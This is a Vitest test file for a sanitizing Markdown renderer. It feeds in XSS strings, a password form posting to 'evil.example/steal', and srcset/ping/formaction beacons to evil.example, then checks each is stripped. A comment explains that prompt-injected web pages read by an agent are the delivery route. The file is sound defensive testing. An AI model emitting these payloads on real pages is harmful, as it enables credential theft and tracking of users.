/**
 * Tests for web/src/lib/markdown.ts — safe Markdown-to-HTML conversion.
 *
 * Tests both the normal path (marked + DOMPurify) and the fallback path
 * (escapeHtml when deps are missing or throw).
 *
 * @vitest-environment jsdom
 */
import { describe, it, expect, vi } from 'vitest';
import { renderMarkdown } from '../src/lib/markdown';

// ── Null/empty handling ────────────────────────────────────────────

describe('renderMarkdown null/empty input', () => {
  it("returns '' for null", () => {
    expect(renderMarkdown(null)).toBe('');
  });

  it("returns '' for undefined", () => {
    expect(renderMarkdown(undefined)).toBe('');
  });

  it("returns '' for empty string", () => {
    expect(renderMarkdown('')).toBe('');
  });
});

// ── Normal rendering path (marked + DOMPurify available) ────────────

describe('renderMarkdown with marked + DOMPurify', () => {
  it('renders simple markdown as HTML', () => {
    const result = renderMarkdown('**bold**');
    expect(result).toContain('<strong>bold</strong>');
  });

  it('renders inline code', () => {
    const result = renderMarkdown('Use `code` here');
    expect(result).toContain('<code>code</code>');
  });

  it('sanitises dangerous HTML in markdown', () => {
    // Marked passes through raw HTML by default, DOMPurify sanitises it
    const result = renderMarkdown('<img src=x onerror=alert(1)>');
    // DOMPurify strips the onerror attribute
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('alert(1)');
    // The <img> tag may be kept if DOMPurify considers src=x safe, but onerror must be gone
  });

  it('renders paragraphs', () => {
    const result = renderMarkdown('Hello\n\nWorld');
    expect(result).toContain('<p>');
  });
});

// ── Fallback path (marked throws) ───────────────────────────────────

describe('renderMarkdown fallback when marked throws', () => {
  it('falls back to HTML-escaping when marked.parse throws', async () => {
    // NOT vi.mock: it hoists file-wide and broke every normal-path test
    // above (all of them silently exercised the fallback). Spy on the real
    // module for this one test and restore.
    const { marked } = await import('marked');
    const spy = vi.spyOn(marked, 'parse').mockImplementation(() => {
      throw new Error('mock error');
    });
    try {
      const out = renderMarkdown('<script>alert(1)</script>');
      expect(out).not.toContain('<script>');
      expect(out).toContain('&lt;script&gt;');
    } finally {
      spy.mockRestore();
    }
  });
});

// ── Edge cases ──────────────────────────────────────────────────────

describe('renderMarkdown edge cases', () => {
  it('handles plain text', () => {
    const result = renderMarkdown('Just some plain text');
    expect(result).toContain('Just some plain text');
  });

  it('handles text with HTML entities that should be escaped', () => {
    const result = renderMarkdown('x < y && y > z');
    // The < and > should be handled safely
    expect(result).not.toContain('< y');
  });
});

describe('renderMarkdown: what the defaults do not stop', () => {
  /**
   * DOMPurify's defaults stop SCRIPT EXECUTION, and they do it well — probed
   * against this exact version, `<script>`, `javascript:` and `data:` hrefs,
   * every `on*` handler, `<iframe srcdoc>`, `<base>`, `<meta http-equiv>`,
   * `<button formaction>` and both mXSS shapes are all neutralized.
   *
   * What they do not stop is a page that LIES. A login form, a tracking pixel,
   * a full-viewport overlay — none of them need script. That matters more here
   * than in a normal app: everything rendered through this function was written
   * by an agent that reads the open web with web_search / web_fetch, so a
   * prompt-injected page is the delivery vector, and the dashboard is served to
   * anonymous strangers.
   */
  it('strips a credential-harvesting form', () => {
    const out = renderMarkdown(
      '<form action="https://evil.example/steal" method="POST">' +
      '<input name="pw" type="password" placeholder="Session expired">' +
      '<button type="submit">Continue</button></form>');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
    expect(out).not.toContain('evil.example');
  });

  it('strips a full-viewport overlay', () => {
    const out = renderMarkdown(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999">x</div>');
    expect(out).not.toContain('position:fixed');
    expect(out).not.toContain('style=');
  });

  it('strips srcset, ping and formaction', () => {
    expect(renderMarkdown('<img srcset="https://evil.example/t.png 1x">'))
      .not.toContain('srcset');
    expect(renderMarkdown('<a ping="https://evil.example/p" href="#">x</a>'))
      .not.toContain('ping=');
    expect(renderMarkdown('<button formaction="https://evil.example">x</button>'))
      .not.toContain('formaction');
  });

  it('still renders ordinary markdown', () => {
    // A sanitizer that eats the content is not a fix, it is an outage.
    const out = renderMarkdown('# Title\n\nSome **bold** text and `code`.\n\n- a\n- b');
    expect(out).toContain('<h1');
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toContain('<code>code</code>');
    expect(out).toContain('<li>a</li>');
  });

  it('still neutralizes the script vectors the defaults cover', () => {
    // Guards against a config that accidentally re-allows what worked before.
    expect(renderMarkdown('<script>alert(1)</script>')).not.toContain('<script');
    expect(renderMarkdown('<img src=x onerror="alert(1)">')).not.toContain('onerror');
    expect(renderMarkdown('<a href="javascript:alert(1)">x</a>')).not.toContain('javascript:');
  });
});
